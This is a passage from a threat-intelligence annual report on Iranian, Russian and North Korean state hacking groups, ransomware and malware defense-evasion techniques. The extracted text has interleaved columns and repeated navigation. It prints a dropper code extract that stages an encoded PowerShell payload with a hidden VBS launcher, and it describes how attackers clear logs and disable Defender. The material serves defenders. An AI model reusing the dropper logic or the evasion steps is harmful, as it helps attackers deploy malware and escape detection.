Become ClearerThe tasking of COBALT ULSTER56, also known as Seedwormor MuddyWater, became less muddy in January 2022 when apublication57 from U.S. Cyber Command's Cyber National MissionForce attributed the group to the Iranian Ministry of Intelligencedistribute malware to the targets.In addition, a grand jury indictment in October 2021 in the U.S. DistrictCourt for the Southern District of New York of two contractors ofEmennet Pasargad also highlighted connections between supposedlyindependent cybersecurity companies in Iran and the Iraniangovernment. The contractors, both Iranian nationals, were indictedfor computer intrusion, computer fraud, voter intimidation, interstateand Security (also known as MOIS or VAJA). The reporting refers tothreats, and conspiracy offenses for their alleged participation in aCOBALT ULSTER as a "subordinate element", which leaves open thecampaign aimed at influencing and interfering with the 2020 U.S.possibility that MOIS may direct the group but not directly employ it.Presidential Election. The messages were designed to appear as ifthey had been sent60 by a U.S. far\-right political activist group knownContracting out to commercial contractors in Iran is a commonas the Proud Boys.operating model. In July 2021, Facebook identified58 commercialentity Mahak Rayan Afraz (MRA), an IT company in Tehran with ties to010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review43010203040506
0607070808
09Letter From Our CTIOIranian Groups Love to TunnelExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatCTU researchers observed COBALT MIRAGE61 using ngrok and FastCOBALT LYCEUM65 used MilanRAT for DNS tunneling for C2Reverse Proxy for tunneling in its ransomware campaign against U.S.communication. The group debuted MilanRAT in June 2021 in atargets. Third\-party reporting62 also reinforced the extent to whichcampaign against Israeli targets, in which it set up a spoof websiteIranian groups make use of tunneling tools. Open source tunnelingimpersonating Israel\-based software company Chip PC Technologies. Ittools employed by COBALT ULSTER were reported to include Chisel,used this website in two infection chains that ended in the deploymentSecure Socket Funneling (SSF), Ligolo and SharpChisel.of MilanRAT. This formed part of a pivot towards targeting Israel.Ngrok has also been used by COBALT FOXGLOVE63 since at least2020 in phishing attacks and by COBALT AGORA64\. This latter groupfocuses on organizations in the United Arab Emirates, and in Novemberdebuted new malware that CTU researchers refer to as G0Dx. G0Dxprovides basic RAT functionality: file upload, file download, and arbitrarycommand execution via cmd.exe. It communicates with C2 servers viaHTTP and DNS.fh.WriteLine("$data \- \[System.Convert]::FromBase64String("\+""\[BASE 64 ENCODED POWERSHELL PAYLOAD]""\+")");
fh.WriteLine("$decoded \- \[System.Text.Encoding]::UTF8\.GetString($data)");
fh.Writeline("$path \- $env:ALLUSERSPROFILE");
fh.WriteLine("New\-Item \-Path $path"\+"'Windows'"\+" \-ItemType Directory \> $null");
fh.WriteLine("$decoded \> $path"\+"'WindowsSystem.ps1'");
fh.WriteLine("$vbln1\-'set objsh\- CreateObject("WScript.Shell")'");
fh.WriteLine("$vbln2\-'obish.run "powershell.exe \-exec bypass \-windowstyle hidden \-NonInteractive \-noprofile \-FILE
%programdata%WindowsSystem.ps1",0, false'");
fh.Writeline("echo $vbln1 \> C:ProgramDataWindowsrunfile.vbs");
fh.WriteLine("echo $vbln2 \>\> C:ProgramDataWindowsrunfile.vbs");
fh.Close();C:ProgramDataMsNpENg
C:ProgramDataMsNpENgDatabase.MDF
C:ProgramDataMsNpENgLog
C:ProgramDataMsNpENgLog\[a\-z0\-9]{8}d
C:ProgramDataMsNpENgLog\[a\-z0\-9]{8}f
C:ProgramDataMsNpENgLog\[a\-z0\-9]{8}g
C:ProgramDataMsNpENgLog\[a\-z0\-9]{8}s
C:ProgramDataMsNpENgMsNpENg
C:ProgramDataMsNpENgcurent.txtFigure 31\. Files created by MilanRAT. (Source: Secureworks)A new cluster of Iranian activity emerged in June 2022\. It uses a.NET based DNS Backdoor referred to as DnsSystem, thought to bea customized version of the DIG.net open\-source tool. The malwareFigure 30\. Code extract from a G0Dx dropper. (Source: Secureworks)communicates via DNS tunneling, leveraging DNS queries to exchangeC2 traffic with an adversary controlled nameserver. However, incontrast to some third\-party reporting, CTU researchers do notassociate this activity with COBALT LYCEUM.2022 State of the Threat: A Year in Review44010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatIranian Ransomware Continues,
With Limited ImpactRansomware has continued to develop as a theme across IranianIn November 2021, U.S Australian, and British government agenciesthreat group activity in the last 12 months, although it is not alwaysissued a joint advisory69 detailing exploitation since at least Marchclear what the attacks are intended to achieve. Often, they appear to2021 of Fortinet vulnerabilities by an Iranian group in order to gain initialbe used for disruption rather than financial gain.access to systems. The group also exploited the Microsoft ExchangeOver the past year, Secureworks incident responders have investigatedCTU researchers attribute the activity detailed in the advisory toProxyShell vulnerability since at least October 2021 for initial access.COBALT MIRAGE ransomware attacks against organizations in Israel,COBALT MIRAGE.the U.S Europe, and Australia. Elements of COBALT MIRAGE activitywere reported as PHOSPHORUS66 and TunnelVision67, and the groupCOBALT MIRAGE's ransomware attacks exploit popular remote codeis thought linked to COBALT ILLUSION68 (which predominantly usesvulnerabilities (like ProxyShell or Log4Shell) to obtain access, deploypersistent phishing campaigns to obtain initial access in espionage\-tunneling tools including ngrok and FRP, and finally use BitLocker andrelated campaigns).or DiskCryptor to attempt to encrypt systems, not always successfully.Exploit Proxy Shell on 
Exchange server
Drop web shellsActivate DefaultAccount
Deploy scriptstunneling tools
Move laterallyActivate BitLocker on
three hostsSend ransom note to printerON OR BEFORE 2022\-01\-062022\-01\-06 THROUGH 2022\-01\-10Figure 32: COBALT MIRAGE actions in a January 2022 intrusion leading to use of BitLocker. (Source: Secureworks)2022 State of the Threat: A Year in Review45010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatCOBALT MIRAGE also carries out espionage activity, some of whichmay also incorporate ransomware activity. However, while the groupappears to have had a reasonable level of success gaining initialaccess to a wide range of targets, its ability to capitalize on thataccess for financial gain or intelligence collection appears limited. Evenso, at a minimum, COBALT MIRAGE's ability to use publicly availableencryption tools for ransomware operations and mass scan\-and\-exploitactivity to compromise organizations creates an ongoing threat.This group sits alongside several other Iranian threat groups that arealso now targeting Israel with both espionage operations and disruptivecampaigns under the guise of ransomware attacks. These includegroups like N3tw0rm, COBALT SHADOW70 (also known as Agrius), andhack and leak operations like Moses Staff.Moses Staff, tracked by CTU researchers as COBALT SAPLING71,portrays itself as a pro\-Palestinian group intent on using cyberattacksand content on its leak site to intimidate entities in Israel. CTUresearchers assess it more likely that this operation is part of ongoingefforts by Iran\-linked pseudo\-ransomware groups to harass anddisrupt Israeli businesses. COBALT SAPLING is another group usingransomware style malware for disruption rather than financial gain,having used72 PyDcrypt, DCSrv, and Strifewater73 against targetsin Israel. While COBALT SAPLING is known to leak data from theirown intrusions, it is also possible that some of the data listed on theleak site may have been obtained from other sources or intrusionsconducted by other threat actors.2022 State of the Threat: A Year in Review46010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatRussiaThe Near Abroad and a Nod
to the 'Problems' of CybercrimeMain Motivations:EspionageHybrid Warfare2022 State of the Threat: A Year in Review47010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatRussiaRussia's advanced cyber capabilities support the aims of its foreignpolicy to counter Western influence at home and on its near neighbors,and to advance Russia's position as a leader in world affairs. Russiaregards the West, especially the North Atlantic Treaty Organization(NATO) alliance, as an ongoing and central threat to the nationalinterests of the Russian Federation.Combatting Cybercrime
SelectivelyFollowing the Putin\-Biden Summit in June 2021, Russia showedsigns of dealing with its resident cybercriminals. In September2021 part of the Meris botnet was sinkholed after it attackedRussian targets. In January 2022 the FSB arrested 14 allegedmembers of the GOLD SOUTHFIELD (REvil) ransomware 
group, and in February74 Russian authorities shut down three 
carding forums, plus one selling RDP access to compromisedenvironments, and arrested the CEO of a Russia\-based domainregistrar. However, these arrests have not had a significantimpact on the cybercrime landscape, and for the most partRussia\-based cybercriminals continue to operate with impunityso long as they do not target Russian interests. Cooperationwith the U.S. essentially ceased following the invasionof Ukraine.What the War in Ukraine 
has Revealed About Russias 
Cyber CapabilitiesIn the run\-up to the Russian invasion of Ukraine there were validconcerns that destructive cyber capabilities would be deployed on awide\-scale against Ukrainian critical infrastructure and spread beyondUkraine's borders, as occurred with NotPetya75 in 2017\.Those fears appeared unfounded as of late June, with the wiperattack76 targeting Viasat being one of only a handful of examplesof cyberattacks that had effects outside of Ukraine. Equally, therehas been extensive coverage of disruptive attacks by hacktivists onboth sides of the conflict, but their impact has been minor. For mostSecureworks customers, especially those without operations in Ukraineor Russia, the impact has been very limited, with ransomware and othercybercriminal activity remaining a far greater threat.2022 State of the Threat: A Year in Review48010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatHowever, the regular stream of reporting77 from the Computerthreat group, and some of it from China82\. During a public presentationEmergency Response Team of Ukraine (CERT\-UA) describes a steadyat the First conference in June 2022, CERT\-UA revealed that it wascadence of cyber activity directed against Ukrainian targets. Sometracking 43 threat groups and 1,306 cyber incidents so far in 2022\. It isof this activity is identifiably78 from Russian government\-sponsoredlikely that the full effect of how Russian cyber capability has been usedthreat actors, some of it79 from threat actors using cybercriminalto support the military operations is not yet apparent to observerstooling (although that may be to hide its origin), some of it fromoutside of Ukraine.hacktivists, some80 from the potentially Belarussian MOONSCAPE81Ukraine Major Cyber Event TimelineJANUARY 13\-14FEBRUARY 15FEBRUARY 24MARCH 28Cyber attacks using 
WhisperGate wiper malware, 
tentatively attributed by the 
Ukrainian government to a 
Belarus\-aligned group called 
MOONSCAPE (also known 
as Ghostwriter or UNC1151\), 
deface and take down more 
than a dozen Ukrainian 
government websites.A series of DDOS attacks 
knocked ofine websites 
belonging to the Ukrainian 
army, defense ministry, 
and publicly\-owned banks.A cyberattack against Viasats 
satellite KA\-SAT network, likely 
intended to hamper Ukrainian 
communications during Russian 
invasion, causes collateral 
damage in western Europe.Ukrainian xed\-line operator 
Ukrtelecom conrms a 
cyberattack on its core 
infrastructure, describes as 
the most severe cyberattack 
since the start of the Russian 
invasion in February.JANUARY 23FEBRUARY 24FEBRUARY 24MARCH 15MAY 15A series of DDoS and 
destructive wiper 
attacks using 
HermeticWiper 
take place against 
Ukrainian targets.A second wiper, dubbed 
IsaacWiper is used in a 
destructive attack 
against a Ukrainian 
governmental network.Russia invades 
Ukraine.A third wiper named 
CaddyWiper is 
detected in use against 
Ukrainian networks.Russia\-supporting 
hacktivistgroup Killnet 
threatens a wave of 
cyberattacks against 
the U.S. and multiple 
European countries.Figure 33: Timeline of significant initial activity connected with the Russian invasion of Ukraine. (Source: Secureworks)2022 State of the Threat: A Year in Review49010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatCTU researchers have observed limited Russian threat group activitybeyond what has been reported in open source. Of the Russian groupstracked by CTU researchers, IRON TILDEN83 has been the mostvisible, conducting spear phishing attacks primarily against neighboringUkraine but also against Latvias Parliament in April.IRON TILDEN Threat Group ProfileIRON TILDEN, also known as Gamaredon, has a history ofconducting cyber espionage against Ukrainian targets ofinterest, primarily in the government and defense verticals.Active since at least 2013, the threat group's operationstypically consist of aggressive spear phishing campaigns thatutilize malicious VBA scripts inside attached Microsoft Word orExcel documents, designed to install information stealers oncompromised hosts. IRON TILDEN sacrifices some operationalsecurity in favor of high tempo operations, meaning that itsinfrastructure is identifiable through re\-use of specific DynamicDNS providers, Russian hosting providers, and remote templateinjection techniques.In November 2021, the Security Service of Ukraine (SSU)identified five IRON TILDEN members as officers in Russia'sFSB federal security service. Targeting the Saeima (the Latvianparliament) aligns with the FSB's efforts to collect intelligenceon countries surrounding Russia. Latvia has endorsed Ukraine'sbid to join the European Union and passed measures thatsupport Ukraine and condemn Russian hostilities. These actionscould increase attention from foreign threat groups focused onespionage.2022 State of the Threat: A Year in Review50010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatBefore the invasion, CTU researchers assessed that Russia would onlyUkraine have a broader impact, as was the case with the Viasat wiperlaunch direct disruptive attacks against organizations in NATO memberattack. However, Russia is likely attempting to calibrate its activity tocountries if there was a drastic escalation in tensions. That assessmentavoid collateral damage that might provoke a more direct internationalremains unchanged. There remains the possibility that attacks targetingresponse.IRON LIBERTY84
(Espionage)16th CenterBROMINE (Microsoft)
Energetic Bear Berserk Bear (CrowdStrike)
TEMP.Isotope (FireEye)
ALLANITE (Dragos)
Crouching Yeti (Kaspersky)
Dragony (Symantec)
DYMALLOY (Dragos)Federal Security
Service (FSB)IRON HUNTER85
(Espionage)18th CenterIRON TILDEN
(Espionage)Turla
KRYPTON (Microsoft)
Venomous Bear (CrowdStrike)
ITG12 (IBM)
Waterburg (Symantec)ACTINIUM (Microsoft)
Primitive Bear (CrowdStrike)
Armageddon
Blue Otso (PwC)
Dancing Salome (Kaspersky) 
Gamaredon
Shuckworm (Symantec)
UAC\-0010 (CERT\-UA)
WinterFlounder (iDefense)Figure 34\. Russian threat groups tracked by CTU researchers. (Source: Secureworks)Foreign IntelligenceService (SVR)YTTRIUM (Microsoft)
Cozy Bear (CrowdStrike)
APT29 (FireEye)
The Dukes
UNC2452 (Mandiant)NOBELIUM (Microsoft)Dark Halo (Volexity)StellarParticle (CrowdStrike)UNC2452 (FireEye)2022 State of the Threat: A Year in Review51Federal SecurityService (FSB)16th Center18th CenterBROMINE (Microsoft)Energetic Bear Berserk Bear (CrowdStrike)TEMP.Isotope (FireEye)ALLANITE (Dragos)Crouching Yeti (Kaspersky)Dragony (Symantec)DYMALLOY (Dragos)TurlaKRYPTON (Microsoft)Venomous Bear (CrowdStrike)ITG12 (IBM)Waterburg (Symantec)ACTINIUM (Microsoft)Primitive Bear (CrowdStrike)ArmageddonBlue Otso (PwC)Dancing Salome (Kaspersky)GamaredonShuckworm (Symantec)UAC\-0010 (CERT\-UA)WinterFlounder (iDefense)010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatForeign Intelligence 
Service (SVR)IRON HEMLOCK86
(Espionage)YTTRIUM (Microsoft)
Cozy Bear (CrowdStrike)
APT29 (FireEye)
The Dukes
UNC2452 (Mandiant)IRON RITUAL87
(Espionage)NOBELIUM (Microsoft)
Dark Halo (Volexity)
StellarParticle (CrowdStrike)
UNC2452 (FireEye)85th Main Special
Service Center
(GTsSS)IRON TWILIGHT88
(Espionage)Main Intelligence 
Directorate (GUGRU)Main Center of 
Special TechnologiesIRON VIKING89
(Sabotage)STRONTIUM (Microsoft)
Fancy Bear (CrowdStrike)
APT28 (FireEye)
Group 74 (Talos)
PawnStorm (Trend Micro)
Sednit (ESET)
Snakemackerel (iDefense)
Sofacy (Palo Alto)
TG\-4127 (SCWX CTU)
Tsar Team (iSight)IRIDIUM (Microsoft)
BlackEnergy Group
CTG\-7263 (SCWX CTU)
ELECTRUM (Dragos)
HadesOlympicDestroyer (Kaspersky)
IRIDIUM (Microsoft)
Qudedagh (F\-Secure)
Sandworm Team (Trend Micro)
Telebots (ESET)
TEMP.Noble (FireEye)
Voodoo Bear (CrowdStrike)Figure 34 (cont.). Russian threat groups tracked by CTU researchers. (Source: Secureworks)2022 State of the Threat: A Year in Review52010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatDemocratic People's 
Republic of Korea 
Revenue Remains the Major FocusMain Motivations:Financial GainEspionage2022 State of the Threat: A Year in Review53010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatNorth KoreaFor most North Korean threat groups, acquisitive crime remains thecryptocurrency exchanges since 2018, with some single theftsmajor priority to provide income for the pariah state. This tasking isexceeding that amount. The focus has more recently expanded topredominantly driven by the United Nations (UN) sanctions imposeddecentralized finance (DeFi) organizations, their global cryptocurrencyon North Korea because of the country's ongoing engagement in aexchanges, and their users. In March 2022, NICKEL GLADSTONE94nuclear weapons program. An expansion of effort in the past few yearscompromised some of the validator nodes of Ronin, an Ethereum\-is likely driven by the impact on the North Korean economy from thebased cryptocurrency wallet built and operated by Sky Mavis, resultingCOVID\-19 pandemic. This crisis exacerbated the effects of sanctionsin theft of cryptocurrency then valued at over $540 million USD,and isolated the DPRK from China, its closest trading partner. DPRK\-making it one of the largest cryptocurrency heists ever.related threat groups appear to be under pressure to replenish thecountry's diminishing coffers.In April 2022, U.S. agencies updated their reporting95 on NICKELGLADSTONE's activities, including the use of AppleJeus cryptocurrencyThe main exception is a continuation through 2022 of NICKELmalware, stating that as of April the group had targeted various firms,ACADEMY's90 Operation Dream Job, which targeted the defenseentities, and exchanges in the blockchain and cryptocurrency industryand aerospace sectors in 2020 with fake job offers, leading to theusing spear\-phishing campaigns and malware to steal cryptocurrency.installation of malware. Recently, the focus91 has been on the chemicalA second campaign, named TraderTraitor, involved a set of malicioussector. NICKEL KIMBALL92 activity also continued its focus on cybercryptocurrency trading applications that targeted employees ofespionage and intelligence activities aimed at South Korean targets.organizations engaged in blockchain research. CTU researchersCryptocurrency in Their SightsCryptocurrency and decentralized finance organizations (DeFi)have been a major focus of activity. North Korean threat groupshave reportedly93 stolen over $200 million USD annually fromidentified an additional phishing campaign that specifically targetedcryptocurrency exchanges, which started in mid\-2020 but has links toactivity from mid\-2019 that was not attributed at the time. Analysis ofthe infrastructure used across the campaigns suggests that NICKELGLADSTONE was responsible for these incidents.2022 State of the Threat: A Year in Review54010203040506
0607070808
09Letter From Our CTIOU.S. Agencies Strike BackAlso in April 2022, the U.S. Treasury Department OFAC added96 anMultiple ransomware families have been linked to North Korea includingEthereum wallet to its sanctions list after the wallet was used to launderTFlower, Maui, VHD Locker, PXJ, ZZZZ, BEAF, and ChiChi. None of thesestolen funds from the Ronin theft. OFAC attributed this wallet to Northhave appeared in the Secureworks incident response case load toKorean threat actors.It is unclear how effective the inclusion of thedate. This suggests that either the scale of these campaigns is not onEthereum wallet on the OFAC sanctions list will be, given that it is justpar with those of the established, mainly Russian\-speaking cybercrimeone wallet, although it will make moving the funds harder and anygroups or that the victims fall outside of the geographies generallyassociated activity will attract increased scrutiny. The move also signalsserviced by Secureworks.that OFAC does not view cryptocurrencies as outside their remit, or thethreat actors that use them as being untouchable. Also in March, theNevertheless, the continued emergence of samples and evolution ofU.S. Justice Department announced that a former Ethereum developerthese ransomware families strongly suggests that this is one stream ofhad been sentenced to over five years in prison for presenting at arevenue that North Korean operators will continue to pursue. Indeed,cryptocurrency conference in North Korea without obtaining a licenseransomware may become an even greater focus than cryptocurrencyfrom OFAC to attend.North Korean Ransomware 
Refilling State CoffersNorth Korean groups continue to carry out ransomware attacks, whichare unambiguously for financial gain, although their scale and successrate remains unclear.theft as a result of the volatility of cryptocurrencies. While the valuerealized from the theft of cryptocurrency reserves is sensitive tochanges in the value of that cryptocurrency, with ransomware theextortion demand can be increased to maintain the real\-term value tothe threat actors.Executive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review5507
Defense Evasion 
Offers Its Own 
Detection 
OpportunitiesTo detect an intrusion before significant damage is done, networkdefenders need to identify threat actor activity before the adversaryachieves their objectives. Network defenders really only need to 'getlucky' once, but then must capitalize on that luck by reacting quickly.Organizations make their own luck through widespread monitoringand well\-rehearsed incident response plans.Unsurprisingly, threat actors attempt to counter this by employingevasion measures designed to circumvent security controls. However,the use of an evasion technique sets its own pattern that can bemonitored for and used to detect adversary activity.Observed evasion techniques break down into two broad categories:operational design choices made prior to an intrusion, and tacticalactions once inside a network to shape the environment in a way thatbenefits the attacker and hinders network defenders.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers:
Loaders and InfostealersExploitation of Remote
Services is Now the Most 
Common Access VectorHostile Government\- 
Sponsored Actor Activity
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review56010203040506
0607070808
09Letter From Our CTIOEvasion by DesignWhen compiling malware, developers are turning to specificHook removal and breakpoint detection. Looking for andtechniques to make their code harder to detect and therefore likely todisabling API hooking, commonly used by EDR tools tosurvive longer in the environments they deploy it to. These techniquesintercept and record system API calls, is a technique usedinclude:by malware such as GuLoader99\. Other evasion techniquesimplemented by commodity malware such as GuLoader,Use of less common languages such as Rust and Go forFormBook and BazarLoader include detecting and avoidingmalware development. Newer languages are, in some cases,debugger breakpoints, implementation of sleep commandseasier to use and help in evading signature\-based detectionsthat delay execution in a sandbox environment, insertionand malware analysis tools.Payload size padding. Large payloads are often skippedof ransom instructions to prevent signature detection, andsearching for evidence of a virtual machine environment.by antivirus systems in the name of efficiency. SandboxesDLL sideloading. Despite having been around since the yeartypically will not detonate large files. CTU researchers2000, DLL sideloading continues to be effective for manyobserved Chinese threat group BRONZE BUTLER97 addthreat actors. Malware that uses this technique includespadding to a LowMain downloader file to take it to over 50MBthe HUI Loader and ShadowPad malware described earlier,to circumvent antivirus scanning, in addition to using variousPlugX, and the Vatet loader favored by the GOLD DUPONT100obfuscation techniques including the Opaque Predicates98ransomware group.code obfuscation technique.Executive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers:
Loaders and InfostealersExploitation of Remote
Services is Now the Most 
Common Access VectorHostile Government\- 
Sponsored Actor Activity
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review57010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers:
Loaders and InfostealersExploitation of Remote
Services is Now the Most 
Common Access VectorHostile Government\- 
Sponsored Actor Activity
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatRaspberry Robin Incorporating
Multiple Evasion TechniquesIn early 2022, a number of Secureworks customers were impacted byThe malware also used alternative syntax (such as the use ofa new USB worm dubbed 'Raspberry Robin', which uses a number ofbackslashes) in HTTP requests and removed spaces betweendifferent evasion techniques in an attempt to evade detection. Thecommand line switches in an effort to evade string\-matchingworm uses the trusted Windows Installer (msiexec.exe) process tosignatures.beacon out to its C2 infrastructure, which often sits on compromisedQNAP devices101, using HTTP requests that contain a victim's user anddevice names. CTU researchers also observed Raspberry Robin useTOR exit nodes as additional C2 infrastructure.It also used undocumented command line switches and unusual pipingcommands to evade countermeasures that interpret command linearguments (figure 35\).Figure 35\. Raspberry Robin use of undocumented command line switches and 
pipe commands. (Source: Secureworks)Figure 36\. Additional Raspberry Robin defensive evasion. (Source: Secureworks)CTU researchers observed the threat actor attempting several UserAccount Control (UAC) bypass techniques before ultimately managingto execute a DLL payload with a non\-standard extension, anotherevasion technique (figure 37\). In the screenshot, the threat actor isalso proxying the DLL execution by using the regsvr functionality withinthe database tool odbcconf102, yet another evasion technique.Figure 37\. Raspberry Robin User Account Control bypass. (Source: 
Secureworks)2022 State of the Threat: A Year in Review58Hiding Behind a Veil of 
Legitimacy Embedding
Cobalt Strike in the 
Authenticode SignatureIn mid\-2021, CTU researchers analyzed a BRONZE ATLAS103 CobaltStrike loader recovered from a network intrusion against a U.S. entity.The decrypted loader configuration identified the location of theCobalt Strike payload file on disk, C:UsersPublicNTUSER.DAT. NTUSER.DAT was a signed Windows DLL file (UXLibRes.dll) that included anencrypted Cobalt Strike payload after the Authenticode104 signature(figure 38\).Embedding the payload in this way does not break the verificationof the Authenticode signature, leaving the NTUSER.dat file lookinglegitimate based on having a valid digital signature. Microsoft releaseda security update (MS13\-098105\) to address this vulnerability in 2013,but the change is an opt\-in feature106\.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers:
Loaders and InfostealersExploitation of Remote
Services is Now the Most 
Common Access VectorHostile Government\- 
Sponsored Actor Activity
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatFigure 38\. Cobalt Strike payload embedded in digitally signed Windows binary. 
(Source: Secureworks)2022 State of the Threat: A Year in Review59010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers:
Loaders and InfostealersExploitation of Remote
Services is Now the Most 
Common Access VectorHostile Government\- 
Sponsored Actor Activity
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatShaping the Environment
to Bypass Security ControlsHaving gained access to an environment, threat actors may findthat their freedom of movement is restricted (either deliberately orDuring a Ryuk\-related network intrusion in September 
2021, the ransomware operator added a firewall rule tootherwise) by the network architecture, security controls in place, orpermit outbound network traffic for a legitimate mobsync.the permissions they have when they gain access. CTU researchersexe process that had been injected with Cobalt Strike.commonly see threat actors take steps to bypass those restrictions.Preventing or at least delaying an adversary from being ableSome specific examples include:to escalate privileges to the point where they can manuallyIn mid\-2021, a threat actor successfully broke out ofa Citrix environment using the Open With dialog boxdisable security controls is critical.In November 2021, a threat actor leveraged the ProxyShellwithin a Microsoft Office application before conducting avulnerability to access an internet\-facing server and deployKerberoasting attack to obtain privileged credentials. ThisCobalt Strike. While doing so, the threat actor clearedCitrix break\-out technique has been well documented forWindows event logs on the compromised server using amany years. Organizations should perform regular securitysimple for loop on the command line (figure 39\).testing to identify any potential 'escape routes' fromconstrained environments.Figure 39\. Command line to clear Windows event logs. (Source: Secureworks)2022 State of the Threat: A Year in Review60010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers:
Loaders and InfostealersExploitation of Remote
Services is Now the Most 
Common Access VectorHostile Government\- 
Sponsored Actor Activity
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatIn December 2021, a threat actor compromised an internet\-In mid\-2022, a threat actor conducting a BEC attackfacing server leveraging the Log4Shell vulnerability andcreated a mail\-forwarding rule to forward all received emailsissued a Base64\-encoded PowerShell command to disableto an external email address. Mail forwarding rules areWindows Defender (figure 40\). Base64\-encoding can makecommon in email account compromises, as threat actorscommand line arguments harder for analysts and securityseek to hide their activities from the compromised user,tools to parse, but the presence of Base64\-encodedbut it is possible to detect this activity through effectivecommands alongside other suspicious events provides itsmonitoring of cloud APIs.own detection opportunity.Figure 40\. Encoded PowerShell used to disable Defender. (Source: 
